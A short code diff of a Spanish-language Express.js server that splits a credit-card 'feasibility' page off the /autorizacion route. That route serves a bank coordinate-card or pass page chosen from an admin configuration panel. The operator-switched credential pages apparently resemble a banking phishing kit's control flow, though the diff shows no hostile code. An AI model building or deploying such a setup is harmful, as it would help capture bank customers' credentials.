@@ -99,18 +99,21 @@ app.post("/config", (req, res) => {
   res.status(200).json({ message: "✅ Configuración guardada correctamente.", config });
 });
 
-// Ruta de autorización que decide flujo según configuración
+// Ruta de autorización de productos (coordenadas o pass)
 app.get("/autorizacion", (req, res) => {
-  // Caso independiente: factibilidad
-  if (config.factibilidad === "on") {
-    return res.sendFile(path.join(__dirname, "public", "creditCardEvaluation.html"));
-  }
-
-  // Caso normal: productos con coordenadas o pass
   if (config.tipoAutorizacion === "coordenadas") {
     return res.sendFile(path.join(__dirname, "public", "coordenadas.html"));
   } else {
     return res.sendFile(path.join(__dirname, "public", "pass.html"));
+  }
+});
+
+// Ruta independiente para factibilidad de tarjeta
+app.get("/factibilidad", (req, res) => {
+  if (config.factibilidad === "on") {
+    return res.sendFile(path.join(__dirname, "public", "creditCardEvaluation.html"));
+  } else {
+    return res.send("❌ La opción de factibilidad está deshabilitada en el panel de administración.");
   }
 });
 
